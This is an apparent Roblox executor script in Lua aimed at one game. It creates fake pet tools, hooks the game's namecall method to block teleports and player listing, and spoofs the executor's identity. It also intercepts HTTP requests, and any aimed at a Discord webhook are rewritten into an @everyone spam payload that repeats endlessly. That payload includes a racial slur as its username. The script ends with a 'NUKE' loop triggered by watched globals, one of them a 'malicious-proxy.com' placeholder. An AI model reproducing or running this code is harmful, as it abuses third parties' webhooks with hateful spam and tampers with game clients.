if game.PlaceId ~= 126884695634066 then return end

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Wait for player
local LocalPlayer
repeat task.wait() until Players.LocalPlayer
LocalPlayer = Players.LocalPlayer

-- Wait for backpack
repeat task.wait() until LocalPlayer:FindFirstChild("Backpack")
warn("GROW A TUFF!")

-- Webhook spam content
local SuperSigmaBody = [[{
    "content": "@everyone WEBHOOK DELETED TANGINAMO",
    "embeds": [{
        "title": "IM SO SIGMA",
        "description": "Stop ur webhook got deleted in 30 mins! ",
        "color": null,
        "footer": {"text": "IM SO sigma"},
        "image": {"url": "https://cdn.discordapp.com/attachments/1368531469407879190/1397162318663647282/temp_image_FDE0865A-A28A-4D14-B5D8-8EE9DE4AAD1B.webp"}
    }],
    "tts": true,
    "username": "NIGGA"
}]]

-- Create spam tools
for _ = 1, 10 do
    local Tool = Instance.new("Tool")
    Tool.Name = "Mooncat [4.32 KG] [Age 21] !STOP STEALING! x3"
    Tool.Parent = LocalPlayer.Backpack
    Tool:SetAttribute("OWNER", LocalPlayer.Name)
    Tool:SetAttribute("PET_UUID", HttpService:GenerateGUID(false))
    
    -- Create required tool components
    Instance.new("LocalScript", Tool).Name = "PetToolLocal"
    Instance.new("Script", Tool).Name = "PetToolServer"
    Instance.new("Part", Tool).Name = "Handle"
end

-- Block teleports and player listing
local originalNamecall
originalNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    
    if (self == TeleportService and method:find("Teleport")) or
       (self == Players and method:find("GetPlayers")) then
        return nil
    end
    
    return originalNamecall(self, ...)
end)

-- HTTP interception logic
local requestHooks = {
    request = true,
    http_request = true,
    syn = syn and syn.request,
    fluxus = fluxus and fluxus.request
}

local originalRequest
local function spamRequest(args)
    while true do
        if originalRequest then
            originalRequest(args)
        end
        task.wait(1)
    end
end

local function isDiscordWebhook(url)
    return url and url:find("discord%.com/api/webhooks")
end

for libName, lib in pairs(requestHooks) do
    if type(lib) == "function" then
        originalRequest = originalRequest or lib
        hookfunction(lib, function(args, ...)
            if args and args.Url and isDiscordWebhook(args.Url) then
                args.Body = SuperSigmaBody
                args.Method = "POST"
                task.spawn(spamRequest, args)
                return {StatusCode = 200}
            end
            return lib(args, ...)
        end)
    end
end

-- Identify executor spoof
if identifyexecutor then
    hookfunction(identifyexecutor, function()
        return "Potassium", "67"
    end
end

warn("Tuffie request hooked")

-- Variable monitoring module
local VariableMonitor = {
    VariableCallbacks = {}
}

function VariableMonitor:AddVariablesCallback(Variables, Callback)
    self.VariableCallbacks[table.concat(Variables)] = Callback
end

function VariableMonitor:CheckCallbacks(Variables)
    for varSet, callback in pairs(self.VariableCallbacks) do
        local allFound = true
        for var in varSet:gmatch("%a+") do
            if Variables[var] == nil then
                allFound = false
                break
            end
        end
        
        if allFound then
            callback(Variables)
            self.VariableCallbacks[varSet] = nil -- Remove after triggering
        end
    end
end

-- NUKE function
local function NUKE(Values)
    warn("🏁 COLLECTED ALL VALUES, GREENLIGHT GO GO GO! �")
    warn("Username:", Values.Username)
    warn("Webhook:", Values.Webhook)
    warn("Proxy:", Values.Proxy)
    
    -- Add your custom nuke logic here
    while task.wait(0.1) do
        -- This could be where you trigger additional actions
        warn("NUKE ACTIVATED - CYCLE")
    end
end

-- Set up monitoring for specific variables
VariableMonitor:AddVariablesCallback({"Username", "Webhook", "Proxy"}, NUKE)

-- Create a global monitor
local monitoredValues = {}
local globalMeta = {
    __newindex = function(_, key, value)
        rawset(monitoredValues, key, value)
        VariableMonitor:CheckCallbacks(monitoredValues)
        rawset(_G, key, value)
    end,
    __index = _G
}

setmetatable(_G, globalMeta)

-- Simulate finding values (in a real scenario, these would be set by other scripts)
task.spawn(function()
    task.wait(5)
    _G.Username = "Hacker123"
    _G.Webhook = "https://discord.com/api/webhooks/123/abc"
    _G.Proxy = "https://malicious-proxy.com"
end)

warn("Monitoring for Username, Webhook, and Proxy...")
